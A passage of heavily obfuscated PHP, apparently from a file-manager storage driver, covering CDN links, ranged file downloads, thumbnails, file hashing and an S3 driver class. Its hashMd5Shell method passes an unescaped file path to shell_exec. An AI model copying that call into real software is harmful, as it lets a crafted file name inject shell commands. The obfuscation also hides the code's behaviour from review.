empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($DöÙ‚í æª) { $C®•Š‹•ø =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->isCdnHost()) { return $DöÙ‚í æª; } return str_replace(trim(get_url_root($DöÙ‚í æª), $C®•Š‹•ø[8]), trim($this->cdnHost, $C®•Š‹•ø[8]), $DöÙ‚í æª); } public function uploadLink($d§ÂŸ½‹´, $fÔ‰äá„Å = 0) { goto BÚ•ø¸Ñƒ; CÆ’Š¬Éù: if ($Dí’¿—¾¨) { $Dí’¿—¾¨[$f¶Â‚ÀÑá[89]] = $d§ÂŸ½‹´; $Dí’¿—¾¨[$f¶Â‚ÀÑá[90]] = $bíáé–Ø‰¢; } return $Dí’¿—¾¨; goto B›ÑöÖ÷Ô†; C¹„ÄØÓ³: $eàªªš¨õ” = $fÔ‰äá„Å <= $dÕ³Ë„¡ ? $f¶Â‚ÀÑá[87] : $f¶Â‚ÀÑá[88]; $F É½ÉÆò = (!$fÔ‰äá„Å ? 1 : ceil($fÔ‰äá„Å / pow(1024, 3))) * 3600 * 4; $Dí’¿—¾¨ = $this->{$eàªªš¨õ”}($d§ÂŸ½‹´, $F É½ÉÆò); goto CÆ’Š¬Éù; Cá³÷ãÒÒë: if (!in_array($bíáé–Ø‰¢, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $dÕ³Ë„¡ = 1024 * 1024 * 10; goto C¹„ÄØÓ³; BÚ•ø¸Ñƒ: $f¶Â‚ÀÑá =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->isUploadServer()) { return; } $bíáé–Ø‰¢ = $this->getType(); goto Cá³÷ãÒÒë; B›ÑöÖ÷Ô†: } public function uploadFormData($AÕˆ®”³ìŸ, $e­‹²¤ì„å = 3600) { } public function multiUploadFormData($FŠÀ¹®×º, $bÛ×¾ ¦«µ = 3600) { } public function download($EšÀ¦òé©Ÿ, $cì¦à¼ÅŸ) { } public function ext($bøéå¥ñƒ) { $e‹Õ²¡³Õæ =& $_SERVER[Ö¹ñÒÁ²÷]; if (strpos($bøéå¥ñƒ, $e‹Õ²¡³Õæ[8]) === -1) { $Cİ©Ã°•“ = $bøéå¥ñƒ; } else { $Cİ©Ã°•“ = $this->pathThis($bøéå¥ñƒ); } $D•èº†Íï = $e‹Õ²¡³Õæ[33]; if (strstr($Cİ©Ã°•“, $e‹Õ²¡³Õæ[91])) { $D•èº†Íï = substr($Cİ©Ã°•“, strrpos($Cİ©Ã°•“, $e‹Õ²¡³Õæ[91]) + 1); $D•èº†Íï = strtolower($D•èº†Íï); } if (strlen($D•èº†Íï) > 3 && preg_match($e‹Õ²¡³Õæ[92], $D•èº†Íï, $fŠ„ÇçíÓÓ)) { $D•èº†Íï = $e‹Õ²¡³Õæ[33]; } return $D•èº†Íï; } public function pathThis($BÀ²±º›ø˜) { $F®£ÓªíÓí =& $_SERVER[Ö¹ñÒÁ²÷]; $BÀ²±º›ø˜ = str_replace($F®£ÓªíÓí[93], $F®£ÓªíÓí[8], rtrim($BÀ²±º›ø˜, $F®£ÓªíÓí[8])); $bÏ¥§ŞØÍ = strrpos($BÀ²±º›ø˜, $F®£ÓªíÓí[8]); if ($bÏ¥§ŞØÍ === !1) { return $BÀ²±º›ø˜; } return substr($BÀ²±º›ø˜, $bÏ¥§ŞØÍ + 1); } public function pathFather($b¸¯£å×É) { $Fñ†é«Ì„ƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $b¸¯£å×É = str_replace($Fñ†é«Ì„ƒ[93], $Fñ†é«Ì„ƒ[8], rtrim($b¸¯£å×É, $Fñ†é«Ì„ƒ[8])); $cÖ´˜˜Æà = strrpos($b¸¯£å×É, $Fñ†é«Ì„ƒ[8]); if ($cÖ´˜˜Æà === !1) { return $Fñ†é«Ì„ƒ[33]; } return substr($b¸¯£å×É, 0, $cÖ´˜˜Æà + 1); } public function hashSimple($Eƒ½ØŒ÷¹ë) { goto AÚÃÏ÷®ñö; d³Ù²‹È‹: $B§š“ƒêâè = intval($b‚¸‰ùÅÈ / $DÉ²â×‰ËÇ); $Aªªí“‡İ„ = $d¦‰¹ÕÏë‰[33]; for ($C¡Şİ†÷‘ = 0; $C¡Şİ†÷‘ < $DÉ²â×‰ËÇ; $C¡Şİ†÷‘++) { $Aªªí“‡İ„ .= $this->fileSubstr($Eƒ½ØŒ÷¹ë, $B§š“ƒêâè * $C¡Şİ†÷‘, $cÂ‡Ÿô“‚); } goto ašìÅ¥ÔÔ÷; aÕ Ùç¾™: $cÂ‡Ÿô“‚ = 200; $DÉ²â×‰ËÇ = 50; if ($b‚¸‰ùÅÈ <= $cÂ‡Ÿô“‚ * $DÉ²â×‰ËÇ) { return $this->hashMd5($Eƒ½ØŒ÷¹ë) . $b‚¸‰ùÅÈ; } goto d³Ù²‹È‹; ašìÅ¥ÔÔ÷: $Aªªí“‡İ„ .= $this->fileSubstr($Eƒ½ØŒ÷¹ë, $b‚¸‰ùÅÈ - $cÂ‡Ÿô“‚, $cÂ‡Ÿô“‚); return md5($Aªªí“‡İ„) . $b‚¸‰ùÅÈ; goto EŞ­Ò’¤Ã½; AÚÃÏ÷®ñö: $d¦‰¹ÕÏë‰ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$Eƒ½ØŒ÷¹ë) { return md5($d¦‰¹ÕÏë‰[33]); } $b‚¸‰ùÅÈ = $this->size($Eƒ½ØŒ÷¹ë); goto aÕ Ùç¾™; EŞ­Ò’¤Ã½: } public static $md5Cache = array(); public function hashMd5($BÓÙ‡÷¿¤µ) { $BÓÙ‡÷¿¤µ = $this->iconvSystem($BÓÙ‡÷¿¤µ); if (isset(self::$md5Cache[$BÓÙ‡÷¿¤µ])) { return self::$md5Cache[$BÓÙ‡÷¿¤µ]; } self::$md5Cache[$BÓÙ‡÷¿¤µ] = $this->hashMd5Shell($BÓÙ‡÷¿¤µ); if (!self::$md5Cache[$BÓÙ‡÷¿¤µ]) { self::$md5Cache[$BÓÙ‡÷¿¤µ] = @md5_file($BÓÙ‡÷¿¤µ); } return self::$md5Cache[$BÓÙ‡÷¿¤µ]; } private function hashMd5Shell($Aäéó¡ó) { goto B†ğ¯ôºŠ; FŠ­éÙ‰á­: $a—ÕØìâ‚ = shell_exec($bß¹­Ìâ…ˆ . "\40\x22{$Aäéó¡ó}\42"); return substr($a—ÕØìâ‚, 0, 32); goto aù°ğˆäÑÃ; B†ğ¯ôºŠ: $Fâ’ø­Ö¼„ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!function_exists($Fâ’ø­Ö¼„[94])) { return !1; } $e¤Êšğ¡Ô = array($Fâ’ø­Ö¼„[95], $Fâ’ø­Ö¼„[96]); goto AÃî‚¡¨¡£; AÃî‚¡¨¡£: $bß¹­Ìâ…ˆ = Cache::get($Fâ’ø­Ö¼„[97]); if (!$bß¹­Ìâ…ˆ) { $dÓ¹Ûš”ñ = BASIC_PATH . $Fâ’ø­Ö¼„[98]; $d¬ÒÃğ‡öµ = md5_file($dÓ¹Ûš”ñ); $bß¹­Ìâ…ˆ = $Fâ’ø­Ö¼„[99]; foreach ($e¤Êšğ¡Ô as $cŒ’å¨™·) { $a—ÕØìâ‚ = shell_exec($cŒ’å¨™· . "\x20\x22{$dÓ¹Ûš”ñ}\42"); if ($a—ÕØìâ‚ && substr(trim($a—ÕØìâ‚), 0, 32) == $d¬ÒÃğ‡öµ) { $bß¹­Ìâ…ˆ = $cŒ’å¨™·; break; } } Cache::set($Fâ’ø­Ö¼„[97], $bß¹­Ìâ…ˆ, 3600); } if ($bß¹­Ìâ…ˆ == $Fâ’ø­Ö¼„[99]) { return !1; } goto FŠ­éÙ‰á­; aù°ğˆäÑÃ: } public function link($AùÌÊÆöíÂ) { return $AùÌÊÆöíÂ; } public function fileOut($DòšÛ…‹Æê, $c¯Êáõ‰‘ = false, $d‡ïù¢è‡ = false, $eˆ¼£Ñ™ëÜ = '') { goto E˜ğ¸É«°Ë; e¦³ùÂ••: $Fƒªš‡ğôÁ = 0; $C¡ÜÅ†²±ˆ = $a›ÈÌ±¸Êæ - 1; $FÂÌ™ë¨ìò = $this->ext($eÑ“Úà¶‡Š); goto AåŞòŸ‰ÅÂ; F¼¸È˜Üõî: header($D‹¾†Šííó[124]); header($D‹¾†Šííó[125]); header($D‹¾†Šííó[126]); goto a†“Ü—Ó; B¡˜¡„œ¸ : header($D‹¾†Šííó[134] . $a›ÈÌ±¸Êæ); header($D‹¾†Šííó[135]); if (!$c¯Êáõ‰‘ && $FÂÌ™ë¨ìò == $D‹¾†Šííó[136]) { if ($a›ÈÌ±¸Êæ > 1024 * 1024 * 5) { die; } $a‘Ûƒ±Á„ = $this->getContent($DòšÛ…‹Æê); $a‘Ûƒ±Á„ = Html::clearSVG($a‘Ûƒ±Á„); echo $a‘Ûƒ±Á„; die; } goto C×‰íùÔ˜ˆ; C×‰íùÔ˜ˆ: $C­¬äÉê“ = strtolower($_SERVER[$D‹¾†Šííó[137]]); if ($F¾‡µêÖæ¹ && $C­¬äÉê“ && $eõÕæ¼¹•š) { if (strstr($C­¬äÉê“, $D‹¾†Šííó[138])) { header($D‹¾†Šííó[139] . $DòšÛ…‹Æê); } else { if (strstr($C­¬äÉê“, $D‹¾†Šííó[140])) { header($D‹¾†Šííó[141] . $DòšÛ…‹Æê); } else { if (strstr($C­¬äÉê“, $D‹¾†Šííó[142])) { header($D‹¾†Šííó[143] . $DòšÛ…‹Æê); } } } if ($C„Ø™ä£íê) { header($D‹¾†Šííó[144] . $C„Ø™ä£íê); } return; } if (isset($_SERVER[$D‹¾†Šííó[145]])) { if (preg_match($D‹¾†Šííó[146], $_SERVER[$D‹¾†Šííó[145]], $Fà™ì÷ˆ–¾)) { $Fƒªš‡ğôÁ = intval($Fà™ì÷ˆ–¾[1]); if (!empty($Fà™ì÷ˆ–¾[2])) { $C¡ÜÅ†²±ˆ = intval($Fà™ì÷ˆ–¾[2]); } } header($D‹¾†Šííó[147]); header("\x43\157\156\x74\x65\x6e\164\55\x52\x61\x6e\x67\145\x3a\40\142\171\164\x65\x73\x20{$Fƒªš‡ğôÁ}\55{$C¡ÜÅ†²±ˆ}\x2f" . $a›ÈÌ±¸Êæ); } else { header($D‹¾†Šííó[148]); } goto f—–Úà«ç; d¤‡¿¨…ï¸: $eÌèÓÓç˜ = rawurlencode($eÑ“Úà¶‡Š); $eÌèÓÓç˜ = $D‹¾†Šííó[112] . $eÌèÓÓç˜ . $D‹¾†Šííó[116] . $eÌèÓÓç˜; if ($c¯Êáõ‰‘) { header($D‹¾†Šííó[117]); header($D‹¾†Šííó[118] . $eÌèÓÓç˜); } else { header($D‹¾†Šííó[119] . $eÌèÓÓç˜); } goto Dô·’‚‚£Ë; f—–Úà«ç: header($D‹¾†Šííó[149] . ($C¡ÜÅ†²±ˆ - $Fƒªš‡ğôÁ + 1)); if ($_SERVER[$D‹¾†Šííó[150]] == $D‹¾†Šííó[151]) { return; } $Cƒ÷¨²‘‹Ï = 1024 * 100; goto e£»îÛÒå; a†“Ü—Ó: if (isset($_SERVER[$D‹¾†Šííó[127]]) && strtotime($_SERVER[$D‹¾†Šííó[127]]) == $E‹áì½ŒóÑ[$D‹¾†Šííó[106]]) { header($D‹¾†Šííó[128], !0, 304); die; } if (isset($_SERVER[$D‹¾†Šííó[129]]) && $_SERVER[$D‹¾†Šííó[129]] == $eˆ¼£Ñ™ëÜ) { header($D‹¾†Šííó[130] . $eˆ¼£Ñ™ëÜ, !0, 304); die; } header($D‹¾†Šííó[130] . $eˆ¼£Ñ™ëÜ); goto dõ£‹²Ò†‘; dõ£‹²Ò†‘: header($D‹¾†Šííó[131] . $B“¦ğğôŠ¿ . $D‹¾†Šííó[123]); header($D‹¾†Šííó[132] . $eÑ“Úà¶‡Š); header($D‹¾†Šííó[133]); goto B¡˜¡„œ¸ ; AåŞòŸ‰ÅÂ: if (in_array($FÂÌ™ë¨ìò, array($D‹¾†Šííó[107], $D‹¾†Šííó[108], $D‹¾†Šííó[109], $D‹¾†Šííó[110]))) { $FÂÌ™ë¨ìò = $D‹¾†Šííó[111]; } if (!$eˆ¼£Ñ™ëÜ) { $eˆ¼£Ñ™ëÜ = md5($B“¦ğğôŠ¿ . $this->hashSimple($DòšÛ…‹Æê)); } $eˆ¼£Ñ™ëÜ = $D‹¾†Šííó[112] . $eˆ¼£Ñ™ëÜ . $D‹¾†Šííó[112]; goto d§ãÜÃê•; d§ãÜÃê•: $fğ˜˜ÁËë = get_file_mime($FÂÌ™ë¨ìò); if (strstr($fğ˜˜ÁËë, $D‹¾†Šííó[113])) { $fğ˜˜ÁËë = $fğ˜˜ÁËë . $D‹¾†Šííó[114]; } if ($c¯Êáõ‰‘ === !1 && !mime_support($fğ˜˜ÁËë)) { $c¯Êáõ‰‘ = !0; $fğ˜˜ÁËë = $D‹¾†Šííó[115]; } goto d¤‡¿¨…ï¸; Dô·’‚‚£Ë: header($D‹¾†Šííó[120]); header($D‹¾†Šííó[121] . $fğ˜˜ÁËë); header($D‹¾†Šííó[122] . gmdate($D‹¾†Šííó[105], time() + 3600 * 24 * 30) . $D‹¾†Šííó[123]); goto F¼¸È˜Üõî; e£»îÛÒå: $D¡â»Âç¬ = 0; if ($C„Ø™ä£íê) { $D¡â»Âç¬ = intval(1000 * 1000 * ($Cƒ÷¨²‘‹Ï / $C„Ø™ä£íê)); } while ($Fƒªš‡ğôÁ <= $C¡ÜÅ†²±ˆ) { $AÕâ•„ÛÜÕ = timeFloat(); check_abort(); $eé©¹êŞè¢ = $C¡ÜÅ†²±ˆ - $Fƒªš‡ğôÁ + 1; if ($eé©¹êŞè¢ <= $Cƒ÷¨²‘‹Ï) { $Cƒ÷¨²‘‹Ï = $eé©¹êŞè¢; } echo $this->fileSubstr($DòšÛ…‹Æê, $Fƒªš‡ğôÁ, $Cƒ÷¨²‘‹Ï); $Fƒªš‡ğôÁ += $Cƒ÷¨²‘‹Ï; if ($Cƒ÷¨²‘‹Ï == $eé©¹êŞè¢) { $Fƒªš‡ğôÁ = $C¡ÜÅ†²±ˆ + 1; } if ($D¡â»Âç¬) { $b…Ğ²‡›¼ = intval(1000 * 1000 * (timeFloat() - $AÕâ•„ÛÜÕ)); $dœÂï–êæ = $D¡â»Âç¬ - $b…Ğ²‡›¼; if ($dœÂï–êæ > 5) { usleep($dœÂï–êæ); } } } goto FÑ»‚‰Æ­¢; bØĞëÙÙÏ‘: @ob_end_clean(); set_timeout(); $E‹áì½ŒóÑ = $this->infoFull($DòšÛ…‹Æê); goto FÓàØ ©‹·; E˜ğ¸É«°Ë: $D‹¾†Šííó =& $_SERVER[Ö¹ñÒÁ²÷]; $this->cacheMethod(null, null); if (!$DòšÛ…‹Æê || !$this->exist($DòšÛ…‹Æê)) { show_json(LNG($D‹¾†Šííó[100]), !1, $d‡ïù¢è‡); } goto D–‡Ê¸Ç’‰; FÓàØ ©‹·: $a›ÈÌ±¸Êæ = $E‹áì½ŒóÑ[$D‹¾†Šííó[77]]; $B“¦ğğôŠ¿ = gmdate($D‹¾†Šííó[105], $E‹áì½ŒóÑ[$D‹¾†Šííó[106]]); $eÑ“Úà¶‡Š = $d‡ïù¢è‡ ? $d‡ïù¢è‡ : $this->iconvApp($E‹áì½ŒóÑ[$D‹¾†Šííó[28]]); goto e¦³ùÂ••; D–‡Ê¸Ç’‰: $F¾‡µêÖæ¹ = $this->getType() == $D‹¾†Šííó[101]; $eõÕæ¼¹•š = $GLOBALS[$D‹¾†Šííó[6]][$D‹¾†Šííó[84]][$D‹¾†Šííó[102]][$D‹¾†Šííó[103]]; $C„Ø™ä£íê = (double) $GLOBALS[$D‹¾†Šííó[6]][$D‹¾†Šííó[84]][$D‹¾†Šííó[102]][$D‹¾†Šííó[104]] * 1024 * 1024; goto bØĞëÙÙÏ‘; FÑ»‚‰Æ­¢: } public function fileOutServer($DĞœ£± ÑÎ, $cÂÇÌ±æˆí = false, $c«ŞÉÑËÖ = false, $bÇ«ùæ…ÙĞ = '') { $this->fileOut($DĞœ£± ÑÎ, $cÂÇÌ±æˆí, $c«ŞÉÑËÖ, $bÇ«ùæ…ÙĞ); } public function fileOutLink($cĞ‹¸ÄôÒî) { header($_SERVER[Ö¹ñÒÁ²÷][152] . $cĞ‹¸ÄôÒî); die; } public function cacheMethod($fã‡Ï“½ÅŒ, $BÆø‚Ì†§¡) { goto a…ìçŠÊ; F İöñ¡Œà: if (!is_null($d„âÛš¬—)) { return $d„âÛš¬—; } $d„âÛš¬— = $this->{$fã‡Ï“½ÅŒ}($BÆø‚Ì†§¡); $A™ùÑ†Î” [$bõ²áÆ©Ÿ¯] = $d„âÛš¬—; goto cÎ×ƒó‰¿ù; a…ìçŠÊ: $e¨‹ ­¥À =& $_SERVER[Ö¹ñÒÁ²÷]; static $A™ùÑ†Î”  = array(); $bõ²áÆ©Ÿ¯ = $e¨‹ ­¥À[153] . $fã‡Ï“½ÅŒ . $e¨‹ ­¥À[154] . rtrim($BÆø‚Ì†§¡, $e¨‹ ­¥À[8]); goto Fãèà‰±«È; Fãèà‰±«È: if (is_null($fã‡Ï“½ÅŒ)) { $A™ùÑ†Î”  = array(); return; } if (is_null($BÆø‚Ì†§¡)) { unset($A™ùÑ†Î” [$bõ²áÆ©Ÿ¯]); return; } $d„âÛš¬— = isset($A™ùÑ†Î” [$bõ²áÆ©Ÿ¯]) ? $A™ùÑ†Î” [$bõ²áÆ©Ÿ¯] : null; goto F İöñ¡Œà; cÎ×ƒó‰¿ù: return $d„âÛš¬—; goto Få¼‰äº ; Få¼‰äº : } public function fileOutImage($a„îÚğÃ­ï, $dÂÜäÆŞ³… = 250) { goto AšÛÎ¶Ç; aƒ„íğäµÙ: if ($Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[77]] <= 1024 * 50 || !function_exists($Eàñ¿ñ³½—[155]) || $Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[156]] == $Eàñ¿ñ³½—[157]) { return $this->fileOut($a„îÚğÃ­ï); } if (isset($Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[158]][$Eàñ¿ñ³½—[159]])) { $CÊ£ƒ†“·‹ = $Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[158]][$Eàñ¿ñ³½—[159]]; } else { if (isset($Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[158]][$Eàñ¿ñ³½—[160]])) { $CÊ£ƒ†“·‹ = $Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[158]][$Eàñ¿ñ³½—[160]]; } else { $CÊ£ƒ†“·‹ = md5("{$Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[28]]}\137{$Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[75]]}\x5f{$Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[77]]}"); } } $fÙ‘ø¹ËŒ = "{$CÊ£ƒ†“·‹}\x5f{$dÂÜäÆŞ³…}\56\x70\x6e\147"; goto EÜ­¾«§Á; AšÛÎ¶Ç: $Eàñ¿ñ³½— =& $_SERVER[Ö¹ñÒÁ²÷]; if (substr($a„îÚğÃ­ï, 0, 4) == $Eàñ¿ñ³½—[142]) { $this->fileOutLink($a„îÚğÃ­ï); } $Bù¢ßáÕ˜¾ = $this->info($a„îÚğÃ­ï); goto aƒ„íğäµÙ; E½óé›óÖ¸: $D±™»õÂß² = DATA_THUMB . $fÙ‘ø¹ËŒ; if (!@file_exists($D±™»õÂß²)) { $EÑ­Ğ†ÌŞ = TEMP_FILES; if (!is_dir($EÑ­Ğ†ÌŞ)) { mk_dir($EÑ­Ğ†ÌŞ); } $AÌšì”à‚± = $EÑ­Ğ†ÌŞ . $CÊ£ƒ†“·‹ . $Eàñ¿ñ³½—[91] . $Bù¢ßáÕ˜¾[$Eàñ¿ñ³½—[156]]; if (!@file_exists($AÌšì”à‚±)) { $AÌšì”à‚± = $this->download($a„îÚğÃ­ï, $AÌšì”à‚±); } $eƒËËô”Ü = new ImageThumb($AÌšì”à‚±, $Eàñ¿ñ³½—[163]); $eƒËËô”Ü->prorate($D±™»õÂß², $dÂÜäÆŞ³…, $dÂÜäÆŞ³… * 10); } if (!file_exists($D±™»õÂß²) || filesize($D±™»õÂß²) < 100) { return @file_exists($AÌšì”à‚±) ? IO::fileOut($AÌšì”à‚±) : $this->fileOut($a„îÚğÃ­ï); } goto AÊæ±³š¬; EÜ­¾«§Á: if (!($Bª‰¸ÙÁì« = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Eàñ¿ñ³½—[161]))) { $E¶¿¥åëáÖ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Eàñ¿ñ³½—[162]); } else { $E¶¿¥åëáÖ = KodIO::make($Bª‰¸ÙÁì«); } if ($Bª‰¸ÙÁì« = IO::fileNameExist($E¶¿¥åëáÖ, $fÙ‘ø¹ËŒ)) { $D±™»õÂß² = KodIO::make($Bª‰¸ÙÁì«); return IO::fileOut($D±™»õÂß²); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto E½óé›óÖ¸; AÊæ±³š¬: if (!($aÙ¿÷Ô×„— = IO::move($D±™»õÂß², $E¶¿¥åëáÖ))) { return IO::fileOut($D±™»õÂß²); } del_file($D±™»õÂß²); IO::fileOut($aÙ¿÷Ô×„—); goto A…œŠ¿‚™Ì; A…œŠ¿‚™Ì: } public function fileOutImageServer($FÆƒ‚Éš¢¹, $BÍ‘ÁøĞª = 250) { $this->fileOutImage($FÆƒ‚Éš¢¹, $BÍ‘ÁøĞª); } public function fileNameAuto($a±ˆ‘˜îÊ®, $D•àÂ’ñÑ, $FÈğ·ŒÀÇè = REPEAT_RENAME, $d¤Ò±ƒ‡ïé = false) { goto cßÆ°‹Ğá; c»ÓöÕ¥ºâ: if ($FÈğ·ŒÀÇè == REPEAT_SKIP) { return !1; } $Cİ†‘†Á–Ã = $fŠ ª‰šìÄ[91] . get_path_ext($D•àÂ’ñÑ); $Cİ†‘†Á–Ã = $Cİ†‘†Á–Ã == $fŠ ª‰šìÄ[91] || $d¤Ò±ƒ‡ïé ? $fŠ ª‰šìÄ[33] : $Cİ†‘†Á–Ã; goto Eƒ‹øì­£³; Eƒ‹øì­£³: $a‰Â–‹ÀËÂ = 1; $d›·ÈŸ‚å = substr($D•àÂ’ñÑ, 0, strlen($D•àÂ’ñÑ) - strlen($Cİ†‘†Á–Ã)); $AªòÊÛ†®â = $d›·ÈŸ‚å . "\50{$a‰Â–‹ÀËÂ}\51{$Cİ†‘†Á–Ã}"; goto FÌÍ´«ÒÔÚ; FÌÍ´«ÒÔÚ: while ($this->exist(rtrim($a±ˆ‘˜îÊ®, $fŠ ª‰šìÄ[8]) . $fŠ ª‰šìÄ[8] . $AªòÊÛ†®â)) { $AªòÊÛ†®â = $d›·ÈŸ‚å . "\x28{$a‰Â–‹ÀËÂ}\x29{$Cİ†‘†Á–Ã}"; $a‰Â–‹ÀËÂ++; } return $AªòÊÛ†®â; goto CÎõË‹¡°‘; cßÆ°‹Ğá: $fŠ ª‰šìÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $aÁöÏ‡Û×¹ = $a±ˆ‘˜îÊ® === $fŠ ª‰šìÄ[33] ? $D•àÂ’ñÑ : rtrim($a±ˆ‘˜îÊ®, $fŠ ª‰šìÄ[8]) . $fŠ ª‰šìÄ[8] . $D•àÂ’ñÑ; if ($FÈğ·ŒÀÇè == REPEAT_REPLACE || !$this->exist($aÁöÏ‡Û×¹) || $d¤Ò±ƒ‡ïé && $FÈğ·ŒÀÇè != REPEAT_RENAME_FOLDER) { return $D•àÂ’ñÑ; } goto c»ÓöÕ¥ºâ; CÎõË‹¡°‘: } public function listAllFiles($eŸ”ïÏ·™, $EƒÌË—Âæ, $b¡¤ŠÛ‹êÚ = array()) { goto Cá’¦»¬˜Ì; Cá’¦»¬˜Ì: $Dôí·†Ë–“ =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($EƒÌË—Âæ)) { return array(); } $B¸°öŒáñÁ = array(); goto Eİ’´öõ…¢; Eİ’´öõ…¢: $eŸ”ïÏ·™ = trim($eŸ”ïÏ·™, $Dôí·†Ë–“[8]); foreach ($EƒÌË—Âæ as $dºß‹‘Ó¸) { $F¤ƒ—‚¨İ = ltrim(substr($dºß‹‘Ó¸, strlen($eŸ”ïÏ·™)), $Dôí·†Ë–“[8]); $B¸°öŒáñÁ = array_merge($B¸°öŒáñÁ, $this->slicePath($F¤ƒ—‚¨İ)); } $fŒÉ¥›çÍ = array(); goto aíôŞ³½ƒ¶; aíôŞ³½ƒ¶: foreach (array_unique($B¸°öŒáñÁ) as $dºß‹‘Ó¸) { $b¥‡·Î¡à = array($Dôí·†Ë–“[75] => $this->getPathOuter($Dôí·†Ë–“[8] . $eŸ”ïÏ·™ . $Dôí·†Ë–“[8] . $dºß‹‘Ó¸), $Dôí·†Ë–“[76] => 1, $Dôí·†Ë–“[77] => 0); if (substr($dºß‹‘Ó¸, -1) != $Dôí·†Ë–“[8]) { $b¥‡·Î¡à[$Dôí·†Ë–“[76]] = 0; $eÉ½‚ÇŒ• = $this->getPath($eŸ”ïÏ·™ . $Dôí·†Ë–“[8] . $dºß‹‘Ó¸); $b¥‡·Î¡à[$Dôí·†Ë–“[77]] = isset($b¡¤ŠÛ‹êÚ[$eÉ½‚ÇŒ•]) ? $b¡¤ŠÛ‹êÚ[$eÉ½‚ÇŒ•] : $this->size($eÉ½‚ÇŒ•); } $fŒÉ¥›çÍ[] = $b¥‡·Î¡à; } return $fŒÉ¥›çÍ; goto dºö¬³Ü; dºö¬³Ü: } public function slicePath($CÖæ‰²Ù©) { $d‰Ì›õìäÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $b…ïô‰æ© = explode($d‰Ì›õìäÑ[8], trim($CÖæ‰²Ù©, $d‰Ì›õìäÑ[8])); $e÷¥¨œÄ¶Œ = 0; do { ++$e÷¥¨œÄ¶Œ; $DéÚ­©òÑò[] = implode($d‰Ì›õìäÑ[8], array_slice($b…ïô‰æ©, 0, $e÷¥¨œÄ¶Œ)) . $d‰Ì›õìäÑ[8]; } while ($e÷¥¨œÄ¶Œ < count($b…ïô‰æ©)); $DéÚ­©òÑò[count($b…ïô‰æ©) - 1] = $CÖæ‰²Ù©; return $DéÚ­©òÑò; } public function getHost() { $aä‹±ãÔ¦ =& $_SERVER[Ö¹ñÒÁ²÷]; $aŠƒ°†İ¼ = parse_url(trim($this->domain, $aä‹±ãÔ¦[8])); $D£‹‰×™Àã = isset($aŠƒ°†İ¼[$aä‹±ãÔ¦[164]]) ? $aŠƒ°†İ¼[$aä‹±ãÔ¦[164]] : http_type(); $BŠ‹‘ºÁ£ = isset($aŠƒ°†İ¼[$aä‹±ãÔ¦[165]]) ? $aŠƒ°†İ¼[$aä‹±ãÔ¦[165]] : $aŠƒ°†İ¼[$aä‹±ãÔ¦[75]]; if (isset($aŠƒ°†İ¼[$aä‹±ãÔ¦[166]])) { $BŠ‹‘ºÁ£ .= $aä‹±ãÔ¦[4] . $aŠƒ°†İ¼[$aä‹±ãÔ¦[166]]; } return $D£‹‰×™Àã . $aä‹±ãÔ¦[167] . $BŠ‹‘ºÁ£; } public function pathEncode($FšŸ¦µß) { $Cå ôÈ“ê¢ =& $_SERVER[Ö¹ñÒÁ²÷]; return str_replace($Cå ôÈ“ê¢[168], $Cå ôÈ“ê¢[8], rawurlencode($FšŸ¦µß)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($CÔÖÛŞƒ‡Š) { set_timeout(); require_once SDK_DIR . $_SERVER[Ö¹ñÒÁ²÷][169]; parent::__construct(); $this->_init($CÔÖÛŞƒ‡Š); } public function _init($FÑ×ò¾Áñà) { foreach ($FÑ×ò¾Áñà as $E›ó±ã­ÊÏ => $b²‘¯”Œˆ) { if (isset($this->{$E›ó±ã­ÊÏ})) { $this->{$E›ó±ã­ÊÏ} = $b²‘¯”Œˆ; } } $this->endpoint = $FÑ×ò¾Áñà[$_SERVER[Ö¹ñÒÁ²÷][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($c††ô¦Ôß = "\x76\64") { $this->signVer = $c††ô¦Ôß; $this->client->setSignatureVersion($c††ô¦Ôß); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto c„‰§ëÃ–; eÅËÍµ’: if ($C…šßÊïšª[$eÉŒœÊÊîÍ[171]] != $eÉŒœÊÊîÍ[172] || $C…šßÊïšª[$eÉŒœÊÊîÍ[173]] != $eÉŒœÊÊîÍ[172]) { return !1; } $fÕë›¯ÈÇ§ = array_map($eÉŒœÊÊîÍ[174], $C…šßÊïšª[$eÉŒœÊÊîÍ[175]]); if (!is_array($fÕë›¯ÈÇ§)) { $fÕë›¯ÈÇ§ = array(); } goto F×˜»µ‚…Ğ; F×˜»µ‚…Ğ: $cƒ‰³öƒƒ³ = array($eÉŒœÊÊîÍ[176], $eÉŒœÊÊîÍ[177], $eÉŒœÊÊîÍ[178], $eÉŒœÊÊîÍ[179], $eÉŒœÊÊîÍ[180]); $aÏ‚«ŒÛ¥Ã = array_diff($cƒ‰³öƒƒ³, $fÕë›¯ÈÇ§); return empty($aÏ‚«ŒÛ¥Ã); goto fäøóÂŸí; c„‰§ëÃ–: $eÉŒœÊÊîÍ =& $_SERVER[Ö¹ñÒÁ²÷]; 